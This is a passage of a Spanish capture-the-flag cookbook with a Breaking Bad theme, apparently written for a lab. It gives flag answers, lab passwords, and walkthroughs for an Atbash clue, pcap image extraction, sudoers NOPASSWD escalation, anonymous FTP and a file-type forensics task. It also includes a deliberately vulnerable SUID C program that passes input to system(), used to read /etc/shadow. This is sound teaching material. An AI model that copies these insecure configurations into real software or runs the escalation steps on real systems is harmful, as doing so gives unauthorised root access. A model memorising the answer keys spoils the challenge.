<li><p>A se convierte en Z</p></li>
<li><p>B se convierte en Y</p></li>
<li><p>C se convierte en X</p></li>
<li><p>...</p></li>
<li><p>X se convierte en C</p></li>
<li><p>Y se convierte en B</p></li>
<li><p>Z se convierte en A</p></li>
</ul>
<p>Para aplicar el cifrado, simplemente sustituyes cada letra del
mensaje original por su equivalente Atbash. Los nÃºmeros y los caracteres
que no son letras suelen dejarse sin cambios.</p>
<p><strong>CaracterÃ­sticas Clave</strong></p>
<ul>
<li><p>Autoinverso: Una caracterÃ­stica Ãºnica del Atbash es que es
autoinverso. Esto significa que cifrar un mensaje dos veces con Atbash
te devuelve el mensaje original. Si A se convierte en Z, y luego Z se
convierte en A, el proceso se revierte perfectamente.</p></li>
<li><p>Simplicidad: Es uno de los cifrados mÃ¡s simples y antiguos
conocidos.</p></li>
<li><p>OrÃ­genes: Tiene sus raÃ­ces en el hebreo antiguo. El nombre
"Atbash" proviene de las dos primeras letras hebreas (Aleph, Tav) y las
dos Ãºltimas (Bet, Shin), que son las que se intercambian.</p></li>
</ul>
<p><strong>Ejemplo</strong></p>
<p>Si quieres cifrar la palabra "HOLA" usando Atbash:</p>
<ul>
<li><p>H se convierte en S (H es la 8Âª letra, S es la 8Âª desde el
final)</p></li>
<li><p>se convierte en L (O es la 15Âª letra, L es la 15Âª desde el
final)</p></li>
<li><p>L se convierte en O</p></li>
<li><p>A se convierte en Z</p></li>
</ul>
<p>AsÃ­, "HOLA" cifrado con Atbash serÃ­a "SLOZ".</p>
<p>Usamos un servicio online para descifrarlo:</p>
<p><a
href="https://ciphersonline.com/es/cifrado-atbash">https://ciphersonline.com/es/cifrado-atbash</a></p>
<p><img src="cookbook/media/image76.png"
style="width:5.90694in;height:2.89375in" /></p>
<p>Tras aplicar cifrado Atbash, aparece el siguiente mensaje:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>La DEA ha encontrado una foto como pista. La captura de trÃ¡fico de
red http_jpeg esconde la Mosca 10</p>
<p>--&gt;</p>
<p>Esto nos lleva al archivo de captura http_jpeg.pcap que se encuentra
en la carpeta archivos.</p>
<p><span id="_Toc207189866" class="anchor"></span><strong>ğŸ§ª
Procedimiento tÃ©cnico</strong></p>
<p><strong>1. Â¿CÃ³mo se ha montado el entorno de captura</strong></p>
<p>En el reto se simula la transferencia de una imagen .jpg mediante
trÃ¡fico HTTP. Para recrearlo:</p>
<p>cd carpeta_con_imagen</p>
<p>python -m http.server 8000</p>
<p>Accedemos a http://localhost:8000/imagen.jpg desde el navegador
mientras Wireshark captura.</p>
<p>Es una captura de wireshark que supone un ejemplo de cÃ³mo volver a
montar una secuencia HTTP y extraer y guardar en un archivo una imagen
de JPEG desde el interior de un HTTP PDU.</p>
<p><strong>2. Analizar el trÃ¡fico en Wireshark</strong></p>
<p>En Wireshark:</p>
<ul>
<li><p>Filtramos con http o tcp.port == 8000</p></li>
<li><p>Buscamos la respuesta HTTP 200 OK que contiene el JPEG</p></li>
<li><p>Localizamos el paquete correspondiente (por ejemplo, lÃ­nea 347
del http_jpeg.pcap)</p></li>
</ul>
<p><img src="cookbook/media/image77.png"
style="width:5.90694in;height:2.36458in" /></p>
<p><img src="cookbook/media/image78.png"
style="width:5.90556in;height:4.625in" /></p>
<p><strong>3. Exportar la imagen reconstruida</strong></p>
<p>A continuaciÃ³n, hacemos clic derecho en el protocolo JPG y
seleccionamos "Exportar bytes de paquete" y guardarlo en un archivo con
el nombre que queramos y la extensiÃ³n jpeg.</p>
<p>Export Packet Bytes â†’ Guardar como imagen.jpeg</p>
<p>Esto crea un archivo JPEG que puede visualizarse normalmente.</p>
<p><img src="cookbook/media/image79.png"
style="width:5.09375in;height:1.17986in" /></p>
<p>Ahora puedes abrir la imagen para visualizarla</p>
<p><strong>4. Verificar el contenido oculto</strong></p>
<p>Al abrir la imagen exportada, se revela una imagen con el texto:
<strong>LA MOSCA 10 ES: â€˜WALTER_WHITEâ€™.</strong></p>
<p><img src="cookbook/media/image80.png"
style="width:5.90694in;height:3.67361in" /></p>
<p><span id="_Toc207189867" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 10 atrapada: 'WALTER_WHITE'</mark></p>
<p><span id="_Toc207189868" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto enseÃ±a cÃ³mo reconstruir archivos desde flujos de red
usando herramientas forenses reales.</p></li>
<li><p>Simula un entorno de captura HTTP de forma controlada.</p></li>
<li><p>Refuerza habilidades en reconocimiento de protocolo, filtrado de
trÃ¡fico y exportaciÃ³n de datos binarios.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="section-3"></h1>
<h1 id="section-4"></h1>
<h1 id="resoluciÃ³n-de-banderas"><strong>ResoluciÃ³n de
Banderas</strong></h1>
<h1 id="section-5"></h1>
<p><img src="cookbook/media/image81.jpeg"
style="width:5.90556in;height:3.37431in" /></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-1-escalada-de-privilegios-mediante-configuraciÃ³n-vulnerable-en-etcsudoers"><strong>ğŸ
Bandera 1 â€“ Escalada de Privilegios mediante configuraciÃ³n vulnerable en
/etc/sudoers</strong></h1>
<p><strong>CategorÃ­a:</strong> Privilege Escalation<br />
<strong>Nivel:</strong> Medio<br />
<strong>Flag:</strong> d41d8cd98f00b204e9800998ecf8427e<br />
<strong>Usuario involucrado:</strong> chow<br />
<strong>ContraseÃ±a:</strong> Ch0w$up1</p>
<p><span id="_Toc207189871" class="anchor"></span><strong>ğŸ” Objetivo
del reto</strong></p>
<p>El jugador debe identificar una configuraciÃ³n insegura en el sistema
que permite al usuario chow ejecutar comandos como root sin necesidad de
introducir la contraseÃ±a. Esto le permitirÃ¡ acceder a un archivo
protegido por root donde se encuentra la bandera.</p>
<p><span id="_Toc207189872" class="anchor"></span><strong>âš™ï¸ PreparaciÃ³n
del entorno realizada</strong></p>
<p>El entorno incluye los siguientes pasos realizados:</p>
<ol type="1">
<li><p><strong>CreaciÃ³n de usuario vulnerable</strong>:</p></li>
</ol>
<blockquote>
<p>sudo useradd -m chow</p>
<p>echo 'chow:Ch0w$up1' | sudo chpasswd</p>
<p><img src="cookbook/media/image82.png"
style="width:5.90556in;height:1.225in" /></p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>ModificaciÃ³n del archivo /etc/sudoers usando
visudo</strong>:</p></li>
</ol>
<blockquote>
<p>chow ALL=(ALL) NOPASSWD:ALL</p>
<p>Esto otorga permisos de superusuario a chow sin necesidad de
contraseÃ±a.</p>
<p><img src="cookbook/media/image83.png"
style="width:5.90556in;height:4.42361in" /></p>
</blockquote>
<ul>
<li><p>Se han eliminado privilegios innecesarios de chow.</p></li>
</ul>
<p><span id="_Toc207189873" class="anchor"></span><strong>ğŸ“ Bandera
escondida</strong></p>
<p>La bandera se encuentra en:</p>
<p>/root/bandera1.txt</p>
<p>Y su contenido es:</p>
<p>FLAG1{d41d8cd98f00b204e9800998ecf8427e}</p>
<p>Este archivo solo puede ser leÃ­do por el usuario root.</p>
<p><span id="_Toc207189874" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Conectarse al usuario chow</strong></p>
<p>Usaremos la contraseÃ±a de chow encontrada en la fase de
reconocimiento.</p>
<p>ConexiÃ³n SSH usando la contraseÃ±a de chow</p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseÃ±a, introduce:</p>
<p>Ch0w$up1</p>
<p>Verifica que has entrado como chow:</p>
<p>id</p>
<p># uid=1001(chow) gid=1001(chow) grupos=1001(chow)</p>
<p><img src="cookbook/media/image84.png"
style="width:5.90556in;height:4.90556in" /></p>
<p><img src="cookbook/media/image85.png"
style="width:5.90556in;height:0.78125in" /></p>
<p><strong>2ï¸âƒ£ Escalada a root aprovechando NOPASSWD</strong></p>
<p><strong>Comprueba tus privilegios sudo:</strong></p>
<p>sudo -l</p>
<p># (ALL) NOPASSWD: ALL</p>
<p><img src="cookbook/media/image86.png"
style="width:5.90556in;height:1.8125in" /></p>
<p><strong>Consigue shell root:</strong></p>
<p>sudo su â€“</p>
<p><img src="cookbook/media/image87.png"
style="width:5.90556in;height:0.51736in" /></p>
<p>âœ… Â¡Tienes acceso!</p>
<p><strong>3ï¸âƒ£ Leer la bandera como superusuario</strong></p>
<p>sudo cat /root/bandera1.txt</p>
<p><img src="cookbook/media/image88.png"
style="width:5.90556in;height:2.17292in" /></p>
<p>Salida esperada:</p>
<p>FLAG1{d41d8cd98f00b204e9800998ecf8427e}</p>
<p><span id="_Toc207189875" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El jugador debe identificar que el archivo contraseÃ±a.txt es un
seÃ±uelo.</p></li>
<li><p>Con sudo -l, puede descubrir que tiene acceso total sin
contraseÃ±a.</p></li>
<li><p>La tÃ©cnica explotada es una <strong>escalada horizontal que se
convierte en vertical</strong> gracias al mal uso de NOPASSWD.</p></li>
</ul>
<p><span id="_Toc207189876" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 1 atrapada:
'd41d8cd98f00b204e9800998ecf8427e'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-2-acceso-anÃ³nimo-a-servidor-ftp-con-archivos-ocultos"><strong>ğŸ
Bandera 2 â€“ Acceso AnÃ³nimo a Servidor FTP con Archivos
Ocultos</strong></h1>
<p><strong>CategorÃ­a:</strong> Red / Forense<br />
<strong>Nivel:</strong> BÃ¡sico - Medio<br />
<strong>Flag:</strong> pizza_en_el_tejado<br />
<strong>Usuario involucrado:</strong> Acceso anÃ³nimo al servidor FTP</p>
<p><span id="_Toc207189878" class="anchor"></span><strong>ğŸ” Objetivo
del reto</strong></p>
<p>El jugador debe descubrir un servidor FTP mal configurado que permite
conexiÃ³n anÃ³nima y localizar un archivo .flag escondido en una carpeta
oculta del sistema. La bandera estÃ¡ en texto plano y se revela tras
conectarse correctamente y enumerar los contenidos ocultos.</p>
<p><span id="_Toc207189879" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<p>El entorno estÃ¡ sobre <strong>Ubuntu Server 14.04.6</strong>, y tiene
las siguientes configuraciones realizadas:</p>
<ul>
<li><p>Paquete instalado:</p></li>
</ul>
<blockquote>
<p>sudo apt-get install vsftpd</p>
</blockquote>
<ul>
<li><p>ConfiguraciÃ³n del archivo /etc/vsftpd.conf:</p></li>
</ul>
<blockquote>
<p>anonymous_enable=YES</p>
<p>anon_root=/var/ftp</p>
</blockquote>
<ul>
<li><p>Carpeta oculta y bandera creadas:</p></li>
</ul>
<blockquote>
<p>sudo mkdir -p /var/ftp/.hidden</p>
<p>echo "FLAG2{pizza_en_el_tejado}" | sudo tee
/var/ftp/.hidden/bandera2.txt &gt; /dev/null</p>
<p><img src="cookbook/media/image89.png"
style="width:5.90556in;height:0.64583in" /></p>
</blockquote>
<ul>
<li><p>Reinicio del servicio:</p></li>
</ul>
<blockquote>
<p>sudo service vsftpd restart</p>
</blockquote>
<p><img src="cookbook/media/image90.png"
style="width:5.90556in;height:0.54444in" /></p>
<p><span id="_Toc207189880" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Escaneo del servicio FTP</strong></p>
<p>El jugador puede usar nmap para descubrir el puerto 21 abierto:</p>
<p>nmap -p 21 192.168.1.44</p>
<p>VerificarÃ¡ que el servicio FTP estÃ¡ activo.</p>
<p><strong>2ï¸âƒ£ ConexiÃ³n al servidor como usuario anÃ³nimo</strong></p>
<p>Usando el cliente FTP en terminal:</p>
<p>ftp &lt;IP_del_servidor&gt;</p>
<p>Al solicitar usuario, se puede ingresar:</p>
<p>Name (&lt;IP&gt;:user): anonymous</p>
<p>Password: (vacÃ­o o cualquier texto)</p>
<p><img src="cookbook/media/image91.png"
style="width:3.94792in;height:2.04167in" /></p>
<p><strong>3ï¸âƒ£ Enumerar archivos ocultos</strong></p>
<p>Una vez dentro del FTP:</p>
<p>cd .hidden</p>
<p>ls -la</p>
<p><img src="cookbook/media/image92.png"
style="width:5.76042in;height:1.44792in" /></p>
<p><img src="cookbook/media/image93.png"
style="width:5.90556in;height:2.6875in" /></p>
<p>âš ï¸ En Linux, los archivos y carpetas ocultos normalmente tienen un
punto (.) al inicio de su nombre. Para verlos desde la terminal, puedes
usar el comando ls con la opciÃ³n -a.</p>
<p>ğŸ—‚ï¸ Comando Ãºtil para listar todo, incluidos ocultos</p>
<p>ls -la /var/ftp</p>
<p>Esto muestra:</p>
<ul>
<li><p>-l: listado detallado con permisos, propietario, tamaÃ±o,
etc.</p></li>
<li><p>-a: incluye archivos ocultos (los que comienzan con .)</p></li>
</ul>
<p><strong>4ï¸âƒ£ Leer el contenido del archivo</strong></p>
<p>Descargamos el fichero con la bandera a la mÃ¡quina de Kali con:</p>
<p>get bandera2.txt</p>
<p>Salimos del ftp con:</p>
<p>bye</p>
<p><img src="cookbook/media/image94.png"
style="width:5.90556in;height:1.90625in" /></p>
<p>Y mostramos el contenido del fichero:</p>
<p>cat bandera2.txt</p>
<p><img src="cookbook/media/image95.png"
style="width:5.90556in;height:1.0625in" /></p>
<p>Salida esperada:</p>
<p>FLAG2{pizza_en_el_tejado}</p>
<p><span id="_Toc207189881" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto introduce al jugador al concepto de <strong>acceso
anÃ³nimo inseguro</strong>.</p></li>
<li><p>Refuerza buenas prÃ¡cticas de enumeraciÃ³n (ls -la) para archivos
ocultos.</p></li>
<li><p>EnseÃ±a cÃ³mo aprovechar configuraciones FTP mal defendidas en
sistemas legacy.</p></li>
</ul>
<p><span id="_Toc207189882" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 2 atrapada: 'pizza_en_el_tejado'</mark><strong><br />
</strong></p>
<h1
id="bandera-3-binario-suid-vulnerable-a-comandos-arbitrarios"><strong>ğŸ
Bandera 3 â€“ Binario SUID Vulnerable a Comandos Arbitrarios</strong></h1>
<p><strong>CategorÃ­a:</strong> Pwn / Privilege Escalation<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> I_am_the_one_who_knocks<br />
<strong>Usuarios involucrados:</strong></p>
<ul>
<li><p>Usuario base: hector / ContraseÃ±a:
<strong>XXXXXXXX</strong></p></li>
<li><p>Usuario root (indirecto): fring</p></li>
</ul>
<p><span id="_Toc207189884" class="anchor"></span><strong>ğŸ” Objetivo
del reto</strong></p>
<p>El jugador inicia como usuario chow, que parece inofensivo. Su misiÃ³n
es descubrir un binario con permisos <strong>SUID,</strong> en el
directorio de hector, que permite ejecutar comandos arbitrarios con
privilegios de root y asÃ­ acceder al archivo protegido con la
bandera.</p>
<p>ğŸ§  <strong>Â¿QuÃ© es un binario con permisos SUID?</strong></p>
<ul>
<li><p>SUID (Set User ID): Es un permiso especial en Linux que, cuando
se aplica a un archivo ejecutable, hace que ese archivo se ejecute con
los privilegios del dueÃ±o del archivo (normalmente root).</p></li>
<li><p>Eso significa que si un usuario normal ejecuta un binario con
SUID y el binario pertenece a root, el binario se ejecutarÃ¡ <strong>como
si fuera root</strong>.</p></li>
</ul>
<p><span id="_Toc207189885" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<p>Crear un usuario como hector con mÃ­nimos privilegios es una muy buena
prÃ¡ctica para simular un entorno de escalada de privilegios o
simplemente para limitar el acceso de forma segura:</p>
<ol type="1">
<li><p>Usuario hector creado sin privilegios:</p></li>
</ol>
<blockquote>
<p>sudo useradd -m hector</p>
<p>echo 'hector:<strong>XXXXXXXX</strong>' | sudo chpasswd</p>
</blockquote>
<ol start="2" type="1">
<li><p>Binario vulnerable creado en /home/hector/:</p>
<ul>
<li><p><strong>CÃ³digo fuente (suid_vuln.c):</strong></p></li>
</ul></li>
</ol>
<blockquote>
<p>#include &lt;stdio.h&gt;</p>
<p>#include &lt;stdlib.h&gt;</p>
<p>int main() {</p>
<p>char comando[100];</p>
<p>printf("Introduce el comando:\n");</p>
<p>fgets(comando, sizeof(comando), stdin);</p>
<p>system(comando);</p>
<p>return 0;</p>
<p>}</p>
<p><img src="cookbook/media/image96.png"
style="width:5.28125in;height:2.07917in" /></p>
</blockquote>
<ul>
<li><p>Compilado como ejecutable:</p></li>
</ul>
<blockquote>
<p>gcc suid_vuln.c -o suid_vuln</p>
<p><img src="cookbook/media/image97.png"
style="width:5.39097in;height:1.08333in" /></p>
</blockquote>
<ol start="3" type="1">
<li><p>Permisos peligrosos asignados:</p>
<ul>
<li><p>Asignado como propiedad de root:</p></li>
</ul></li>
</ol>
<blockquote>
<p>sudo chown root:root suid_vuln</p>
</blockquote>
<ul>
<li><p>Activado permiso SUID:</p></li>
</ul>
<blockquote>
<p>sudo chmod +s suid_vuln</p>
<p><img src="cookbook/media/image98.png"
style="width:5.90556in;height:1.42361in" /></p>
<p><img src="cookbook/media/image99.png"
style="width:5.09234in;height:0.65625in" /></p>
<p><strong>ğŸ§ª Probar que funciona</strong></p>
<p>Como el usuario hector, ejecuta el binario:</p>
<p>./suid_vuln</p>
<p>Y en el prompt, introduce algo como:</p>
<p>whoami</p>
<p>Si te devuelve root, entoncesâ€¦ Â¡has logrado escalar privilegios!
ğŸš€</p>
<p><img src="cookbook/media/image100.png"
style="width:5.20833in;height:1.61458in" /></p>
<p>Ejecuta ahora:</p>
<p>./suid_vuln</p>
<p>Cuando te pida un comando, prueba algo potente como:</p>
<p><img src="cookbook/media/image101.png"
style="width:5.90694in;height:4.12708in" />cat /etc/shadow</p>
<p><strong>ğŸ§ª Â¿QuÃ© estÃ¡ pasando tÃ©cnicamente?</strong></p>
</blockquote>
<ul>
<li><p>Cuando hector ejecuta ./suid_vuln, el sistema le otorga
temporalmente los permisos del propietario del binario, que en este caso
es root.</p></li>
<li><p>El permiso SUID (chmod +s) permite que el binario se ejecute con
los privilegios de su propietario, no de quien lo lanza.</p></li>
<li><p>Por eso, cat /etc/shadow se ejecuta como si lo hiciera root,
aunque estÃ©s logueado como hector.</p></li>
</ul>
<ol start="4" type="1">
<li><p>Bandera escondida como archivo solo accesible por root:</p></li>
</ol>
<blockquote>
<p>echo "FLAG3{I_am_the_one_who_knocks}" | sudo tee
/etc/suid-flags/bandera3.txt &gt; /dev/null</p>
<p>chmod 600 /etc/suid-flags/bandera3.txt</p>
</blockquote>
<p><span id="_Toc207189886" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Acceder como usuario chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<p>Ch0w$up1</p>
<p><img src="cookbook/media/image102.png"
style="width:5.90556in;height:2.17708in" /></p>
<p><strong>2ï¸âƒ£ Localizar y ejecutar el binario SUID</strong></p>
<p>Nos dirigimos al directorio de hector:</p>
<p>cd /home/hector</p>
<p><img src="cookbook/media/image103.png"
style="width:2.02083in;height:0.77083in" /></p>
<p>El nombre del archivo habla por sÃ­ soloâ€¦</p>
<p>Ejecutamos suid_vuln</p>
<p>./suid_vuln</p>
<p>Cuando se muestre:</p>
<p>Introduce un comando:</p>
<p><img src="cookbook/media/image104.png"
style="width:2.32292in;height:0.36458in" /></p>
<p>Escribe:</p>
<p>whoami</p>
<p><img src="cookbook/media/image105.png"
style="width:2.98958in;height:0.55208in" /></p>
<p>Buscamos la bandera en el directorio /etc/:</p>
<p><img src="cookbook/media/image106.png"
style="width:5.90556in;height:3.73819in" /></p>
<p>El directorio que buscamos tiene toda la pinta de ser suid-flags.
Pero si pruebas a ir al directorio verÃ¡s que no puedes:</p>
<p><img src="cookbook/media/image107.png"
style="width:5.90556in;height:2.69931in" /></p>
<p>Tener un binario SUID que te eleva a root no significa que
automÃ¡ticamente todo lo que hagas fuera de ese binario tenga privilegios
de root.</p>
<p>En nuestro caso:</p>
<ul>
<li><p>Cuando entramos por SSH como chow, nuestra shell sigue teniendo
los permisos de chow.</p></li>
<li><p>Al ejecutar ./suid_vuln, sÃ³lo el proceso suid_vuln corre como
root.</p></li>
<li><p>En cuanto sales de ese programa y vuelves a tu shell normal,
pierdes esos privilegios.</p></li>
</ul>
<p>Por eso, ahora que hemos visto que el directorio que nos interesa es
/etc/suid-flags volvemos a ejecutar el binario para poder listar el
contenido:</p>
<p><img src="cookbook/media/image108.png"
style="width:2.95833in;height:1.22917in" /></p>
<p>Dentro de suid-flags encontramos el archivo bandera3.txt</p>
<p><img src="cookbook/media/image109.png"
style="width:4.8125in;height:1.09375in" /></p>
<p>Y por lo explicado anteriormente vamos a necesitar volver a ejecutar
./suid_vuln para leer la bandera:</p>
<p>cat /etc/suid-flags/bandera3.txt</p>
<p><img src="cookbook/media/image110.png"
style="width:3.0625in;height:0.94792in" /></p>
<p>âœ… El binario lo ejecutarÃ¡ como root gracias al permiso SUID.</p>
<p><strong>3ï¸âƒ£ Resultado esperado</strong></p>
<p>FLAG3{I_am_the_one_who_knocks}</p>
<p><span id="_Toc207189887" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El binario vulnerable permite al jugador abusar de system() sin
validaciÃ³n.</p></li>
<li><p>Gracias al SUID, el comando se ejecuta con privilegios de
root.</p></li>
<li><p>El reto enseÃ±a los riesgos de compilar binarios sin control y
asignarles permisos inseguros.</p></li>
</ul>
<p><span id="_Toc207189888" class="anchor"></span><strong>ğŸ“Œ Tip
adicional</strong></p>
<p>El jugador puede verificar los permisos del binario con:</p>
<p>ls -l suid_vuln</p>
<p>VerÃ¡ algo como:</p>
<p>-rwsr-xr-x 1 root root ...</p>
<p>La s en el lugar de ejecuciÃ³n (rws) confirma el flag SUID activo.</p>
<p><span id="_Toc207189889" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 3 atrapada: 'I_am_the_one_who_knocks'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-4-forense-de-archivos-sin-extensiÃ³n"><strong>ğŸ Bandera
4 â€“ Forense de Archivos Sin ExtensiÃ³n</strong></h1>
<p><strong>CategorÃ­a:</strong> Forense / File Recovery / Magic Number
Analysis<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> e4d909c290d0fb1ca068ffaddf22cbd0<br />
<strong>Usuario involucrado:</strong> mike<br />
<strong>ContraseÃ±a:</strong> <strong>XXXXXXXX</strong><br />
<strong>Carpeta relevante:</strong> /home/mike/Lavanderia</p>
<p><span id="_Toc207189891" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe identificar entre 16 archivos sin extensiÃ³n cuÃ¡l
contiene la bandera escondida. El archivo fue preparado para
<strong>ocultar su contenido mediante texto blanco</strong> sobre fondo
blanco en un documento tipo PDF.</p>
<p><span id="_Toc207189892" class="anchor"></span><strong>ğŸ“¦ Contenido
de la carpeta Lavanderia</strong></p>
<p>Archivos sin extensiÃ³n y sin nombres evidentes. Originalmente estos
tenÃ­an formatos como:</p>
<ul>
<li><p>.docx, .xlsx, .eml, .json, .ico, .svg, .xcf, .jpeg, .pdf, .mp3,
.mp4, .iso, .db, .torrent, etc.</p></li>
</ul>
<p>Pero han sido renombrados con una serie numÃ©rica y sin extensiÃ³n,
para obligar al jugador a descubrir su verdadero tipo.</p>
<p><strong>Los archivos originales estÃ¡n formados por:</strong></p>
<ul>
<li><p>Un archivo .db (base de datos SQLite) con una tabla ficticia
llamada pagos, que incluye registros:</p></li>
</ul>
<p>lavanderia_operaciones.db</p>
<p>Puedes abrirlo con herramientas como:</p>
<ul>
<li><p>DB Browser for SQLite (GUI)</p></li>
<li><p>LÃ­nea de comandos: sqlite3 lavanderia_operaciones.db</p></li>
<li><p>usar Python, SQLiteStudio, etc.</p></li>
</ul>
<ul>
<li><p>Un archivo .json, que representa un registro de transacciones
ficticias mÃ¡s una secciÃ³n de "canal de comunicaciÃ³n".</p></li>
<li><p>Un archivo .eml con un mensaje ficticio entre Lydia
Rodarte-Quayle y Mike Ehrmantraut</p></li>
<li><p>Un fichero Excel que representa un libro de cuentas con pagos,
incluyendo a Lydia Rodarte-Quayle</p></li>
<li><p>Un documento tipo contrato que estÃ¡ a nombre de Mike Ehrmantraut,
y hace referencia a una lavanderÃ­a propiedad de Gustavo Fring,</p></li>
<li><p>Un archivo pdf con la ficha de la chica desaparecida.</p></li>
<li><p>Un mp3 con sintonÃ­a intro BB</p></li>
<li><p>Un mp4 de la escena Cocinar es un arte</p></li>
<li><p>Un svg con el logo de los pollos</p></li>
<li><p>Un archivo ico de Heisenberg</p></li>
<li><p>Una imagen jpeg con la foto de la caravana</p></li>
<li><p>Un archivo Torrent de webarchive con los mejores momentos de la
temporada 2</p></li>
<li><p>Una imagen iso de Super Grub2 Disk que pesa 23,7mb</p></li>
<li><p>Y un fichero pdf con la bandera 4 pero escrito en texto de color
blanco:</p></li>
</ul>
<p>Bandera 4: â€˜e4d909c290d0fb1ca068ffaddf22cbd0â€™</p>
<p><img src="cookbook/media/image111.png"
style="width:5.90694in;height:2.70694in" /></p>
<p>Se les ha cambiado el nombre por usa serie numerada:</p>
<p><img src="cookbook/media/image112.png"
style="width:5.90694in;height:3.16667in" /></p>
<p>Y se les ha borrado la extensiÃ³n:</p>
<p><img src="cookbook/media/image113.png"
style="width:5.90694in;height:3.16042in" /></p>
<p><span id="_Toc207189893" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p>ConexiÃ³n SSH usando la cuenta de chow</p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<p>Ch0w$up1</p>
<p>Nos desplazamos has el usuario Mike y vemos que hay una carpeta de
nombre LavanderÃ­a con una serie de archivos numerados consecutivos y sin
extensiÃ³n:</p>
<p><img src="cookbook/media/image114.png"
style="width:5in;height:1.96875in" /></p>
<p><strong>1ï¸âƒ£ Identificar los tipos de archivo</strong></p>
<p>Desde el terminal, utilizar:</p>
<p>cd /home/mike/Lavanderia</p>
<p>file *</p>
<p>Esto darÃ¡ informaciÃ³n como:</p>
<p>archivo01: ISO 9660 CD-ROM filesystem data ...</p>
<p>archivo02: JPEG image data ...</p>
<p>archivo03: PDF document ...</p>
<p>...</p>
<p><img src="cookbook/media/image115.png"
style="width:5.90556in;height:2.77917in" /></p>
<p>Para anÃ¡lisis mÃ¡s detallado:</p>
<p>binwalk archivo03</p>
<p>trid archivo03</p>
<p>xxd archivo03 | head</p>
<p><strong>2ï¸âƒ£ Localizar el archivo tipo PDF</strong></p>
<p>Filtrar con:</p>
<p>file * | grep PDF</p>
<p>Esto revelarÃ¡ los archivos de extensiÃ³n PDF que hay en la carpeta.
Aparecen dos y uno de ellos es el archivo que contiene la bandera.</p>
<p><img src="cookbook/media/image116.png"
style="width:2.96875in;height:0.82292in" /></p>
<p><strong>3ï¸âƒ£ Abrir el PDF oculto</strong></p>
<p>Como estÃ¡ camuflado con texto blanco, se recomienda abrirlo con un
lector PDF visual (Evince, Okular, PDF Studio) y seleccionar todo el
texto.</p>
<p>Lo que vamos a hacer es enviarnos esos dos ficheros PDF a nuestra
mÃ¡quina de Kali para analizarlos:</p>
<p>scp <a
href="mailto:chow@192.168.1.44:/home/mike/Lavanderia/002">chow@192.168.1.44:/home/mike/Lavanderia/002</a>
.</p>
<p>scp <a
href="mailto:chow@192.168.1.44:/home/mike/Lavanderia/007">chow@192.168.1.44:/home/mike/Lavanderia/007</a>
.</p>
<p><img src="cookbook/media/image117.png"
style="width:5.90556in;height:1.92708in" /></p>
<p>Analizamos el contenido de los archivos:</p>
<p>El archivo 007 contiene una ficha de la chica desaparecida y el 002
parece en blanco:</p>
<p><img src="cookbook/media/image118.png"
style="width:3.01556in;height:3.15137in" /> <img
src="cookbook/media/image119.png"
style="width:2.74612in;height:3.13374in" /></p>
<p>Pero al seleccionar con el ratÃ³n el posible contenido del fichero
aparece la bandera:</p>
<p><img src="cookbook/media/image120.png"
style="width:5.90556in;height:1.75in" /></p>
<p><strong>4ï¸âƒ£ Resultado esperado</strong></p>
<p>FLAG4{e4d909c290d0fb1ca068ffaddf22cbd0}</p>
<p><span id="_Toc207189894" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Se explora la tÃ©cnica de <strong>encubrimiento visual</strong>
(white-on-white text).</p></li>
<li><p>Introduce al jugador en herramientas de anÃ¡lisis de archivo por
â€œfirma mÃ¡gicaâ€ o <strong>magic number</strong>.</p></li>
<li><p>Refuerza habilidades en <strong>reconstrucciÃ³n de
extensiÃ³n</strong> sin depender de nombres.</p></li>
</ul>
<p><span id="_Toc207189895" class="anchor"></span><strong>ğŸ§°
Herramientas clave recomendadas</strong></p>
<table>
<colgroup>
<col style="width: 37%" />
<col style="width: 62%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Herramienta</strong></th>
<th style="text-align: center;"><strong>PropÃ³sito</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>file</td>
<td>Identificar tipo de archivo</td>
</tr>
<tr>
<td>binwalk</td>
<td>Detectar encabezado embebido</td>
</tr>
<tr>
<td>trid</td>
<td>Clasificar por firma binaria</td>
</tr>
<tr>
<td>strings</td>
<td>Buscar flag como texto plano</td>
</tr>
<tr>
<td>pdftotext</td>
<td>Extraer contenido visible del PDF</td>
</tr>
<tr>
<td>xxd / hexedit</td>
<td>Ver el encabezado en hexadecimal</td>
